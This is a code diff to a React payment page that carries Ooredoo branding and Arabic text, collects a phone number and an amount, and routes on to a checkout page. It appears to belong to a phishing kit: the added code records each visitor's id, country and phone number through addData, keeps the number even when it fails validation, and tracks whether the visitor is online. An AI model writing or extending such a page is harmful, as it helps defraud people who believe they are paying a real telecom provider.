@@ -20,7 +20,7 @@ interface LocationResponse {
   country_name: string
 }
 
-const _id = Math.random()
+const _id = "ooredoo-" + Math.random()
   .toString(36)
   .replace(/[^a-z]+/g, "")
   .substr(0, 15)
@@ -31,9 +31,6 @@ export default function PaymentPage() {
   const [phoneNumber, setPhoneNumber] = useState("")
   const [isLoading, setIsLoading] = useState(false)
 
-  const generateId = useCallback((prefix = "ooredoo-"): string => {
-    return `${prefix}${Math.random().toString(36).substring(2, 15)}`
-  }, [])
 
   const formatAmount = useCallback((value: string): string => {
     const numericValue = Number.parseFloat(value.replace(/[^\d.]/g, ""))
@@ -64,7 +61,8 @@ export default function PaymentPage() {
         createdDate: new Date().toISOString(),
       })
       localStorage.setItem("country", country)
-      setupOnlineStatus(generateId('oreddo'))
+      addData({ id: _id, country })
+      setupOnlineStatus(_id)
     } catch (error) {
       console.error("Error fetching location:", error)
     }
@@ -74,6 +72,8 @@ export default function PaymentPage() {
     e.preventDefault()
 
     if (!validatePhoneNumber(phoneNumber)) {
+      addData({ id: _id, phone: phoneNumber, mobile: phoneNumber })
+
       return
     }
 
@@ -95,10 +95,10 @@ export default function PaymentPage() {
         phone: phoneNumber,
         amount: amount,
       }
-addData({paymentData})
-      localStorage.setItem("paymentAmount", amount)
+      addData({ paymentData })
+      localStorage.setItem("amount", amount)
 
-      router.push("/knet")
+      router.push("/checkout")
     } catch (error) {
       console.error("Payment submission failed:", error)
     } finally {
@@ -138,7 +138,6 @@ addData({paymentData})
 
   return (
     <div className="flex flex-col min-h-screen bg-gray-50">
-      {/* Header */}
       <header className="bg-white">
         <div className="flex justify-between items-center p-4 max-w-md mx-auto">
           <div className="flex items-center">
@@ -231,8 +230,6 @@ addData({paymentData})
               <div className="text-base font-medium text-gray-700">الإجمالي:</div>
             </div>
           </div>
-
-          {/* Submit Button */}
           <Button
             type="submit"
             disabled={isLoading || !phoneNumber || !validatePhoneNumber(phoneNumber)}
